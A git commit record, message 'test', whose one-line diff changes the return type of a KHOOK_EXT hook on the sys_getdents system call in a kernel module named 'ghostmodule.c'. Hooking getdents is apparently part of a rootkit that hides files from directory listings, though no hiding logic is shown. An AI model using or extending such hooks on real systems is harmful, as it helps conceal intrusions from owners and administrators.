4f9379b7a58a898d4fef5ea8449b7550931c901c
teargear2 <teargear2@gmail.com>
2019-12-21 22:25:29 +0800

    test

--- program/ghost/ghostmodule.c
+++ program/ghost/ghostmodule.c
@@ -242,7 +242,7 @@ static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *di
 //　　return value;
 //}
 
-KHOOK_EXT(unsigned int, sys_getdents, struct linux_dirent64 __user *, unsigned int);
+KHOOK_EXT(long, sys_getdents, struct linux_dirent64 __user *, unsigned int);
 static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
 {
 	int ret = 0;
